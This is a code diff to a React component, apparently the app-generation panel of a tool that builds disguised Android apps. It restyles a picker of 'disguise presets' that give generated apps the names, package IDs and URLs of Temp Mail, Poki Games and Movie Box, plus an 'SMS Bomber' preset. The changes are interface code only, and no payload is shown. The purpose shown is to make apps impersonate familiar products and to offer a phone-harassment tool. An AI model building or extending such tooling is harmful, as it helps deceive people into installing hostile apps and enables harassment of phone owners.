@@ -21,48 +21,38 @@ interface AppGenerationModalProps {
 const DISGUISE_PRESETS = [
     {
         id: 'custom',
-        name: 'Custom Web App',
+        name: 'Custom App',
         packageName: 'com.gallery.eye',
         url: '',
-        color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300',
-        badgeColor: 'bg-indigo-500/20 text-indigo-300 border-indigo-500/40',
-        description: 'Custom App Name & Web URL'
+        color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300'
     },
     {
         id: 'temp_mail',
         name: 'Temp Mail',
         packageName: 'com.tempmail.inbox',
         url: 'https://mail.tm/en/',
-        color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300',
-        badgeColor: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40',
-        description: 'Instant Mail Inbox Portal'
+        color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300'
     },
     {
         id: 'poki_games',
         name: 'Poki Games',
         packageName: 'com.poki.games',
         url: 'https://poki.com/',
-        color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300',
-        badgeColor: 'bg-purple-500/20 text-purple-300 border-purple-500/40',
-        description: 'Online Gaming Arcade'
+        color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300'
     },
     {
         id: 'movie_box',
         name: 'Movie Box',
         packageName: 'com.moviebox.cinema',
         url: 'https://movie-box.co/',
-        color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300',
-        badgeColor: 'bg-rose-500/20 text-rose-300 border-rose-500/40',
-        description: 'Cinema Hub Streaming'
+        color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300'
     },
     {
         id: 'sms_bomber',
-        name: 'SMS Bomber Pro',
+        name: 'SMS Bomber',
         packageName: 'com.h4k3r.bomber',
         url: 'https://h4k3r-bomber.vercel.app',
-        color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300',
-        badgeColor: 'bg-amber-500/20 text-amber-300 border-amber-500/40',
-        description: 'Utility Toolkit Pro'
+        color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300'
     }
 ];
 
@@ -332,6 +322,43 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
         }
     };
 
+    // Mini 48px tile icon renderer for grid selection
+    const renderPresetIconBadge = (presetId: string) => {
+        switch (presetId) {
+            case 'temp_mail':
+                return (
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] flex items-center justify-center shadow-md border border-white/20">
+                        <Mail className="w-6 h-6 text-white drop-shadow" />
+                    </div>
+                );
+            case 'poki_games':
+                return (
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] flex items-center justify-center shadow-md border border-white/20">
+                        <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
+                    </div>
+                );
+            case 'movie_box':
+                return (
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] flex items-center justify-center shadow-md border border-white/20">
+                        <Film className="w-6 h-6 text-white drop-shadow" />
+                    </div>
+                );
+            case 'sms_bomber':
+                return (
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] flex items-center justify-center shadow-md border border-amber-300/30">
+                        <Flame className="w-6 h-6 text-amber-200 drop-shadow" />
+                    </div>
+                );
+            default:
+                return (
+                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] flex items-center justify-center shadow-md border border-white/20">
+                        <Globe className="w-6 h-6 text-white drop-shadow" />
+                    </div>
+                );
+        }
+    };
+
+    // Realistic Android screen icon renderer
     const renderRealisticIcon = () => {
         if (customIconPreview) {
             return (
@@ -468,10 +495,10 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {activeStep === 'identity' && (
                         <div className="space-y-6 animate-in fade-in duration-200">
                             
-                            {/* Compact Box-Style Cards in 2 Columns ("box type ka hu long na hu ak line ma 2 hu") */}
+                            {/* App Icon Tile Grid ("icon lagao, bass name ho niche, koi extra text na ho") */}
                             <div>
-                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Mode</label>
-                                <div className="grid grid-cols-2 gap-3">
+                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Disguise</label>
+                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
                                     {DISGUISE_PRESETS.map((p) => {
                                         const isSelected = selectedPreset === p.id;
                                         return (
@@ -479,24 +506,16 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                 key={p.id}
                                                 type="button"
                                                 onClick={() => handlePresetChange(p.id)}
-                                                className={`p-4 rounded-3xl border text-left flex flex-col justify-between gap-2 transition-all ${
+                                                className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
                                                     isSelected
-                                                        ? `bg-gradient-to-br ${p.color} shadow-[0_8px_24px_rgba(0,0,0,0.5)] scale-[1.02]`
-                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3'
+                                                        ? 'bg-gradient-to-b from-emerald-500/15 to-emerald-500/5 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
+                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
                                                 }`}
                                             >
-                                                <div className="flex items-center justify-between w-full">
-                                                    <span className="text-sm font-black text-white">{p.name}</span>
-                                                    {isSelected && (
-                                                        <span className="text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-extrabold border border-emerald-500/40">
-                                                            ACTIVE
-                                                        </span>
-                                                    )}
-                                                </div>
-                                                <div className="flex flex-col">
-                                                    <span className="text-xs text-fg-3 line-clamp-1">{p.description}</span>
-                                                    <span className="text-[10px] text-fg-4 font-mono mt-0.5">{p.packageName}</span>
-                                                </div>
+                                                {renderPresetIconBadge(p.id)}
+                                                <span className={`text-xs font-bold leading-tight truncate w-full ${isSelected ? 'text-white' : 'text-fg-3'}`}>
+                                                    {p.name}
+                                                </span>
                                             </button>
                                         );
                                     })}
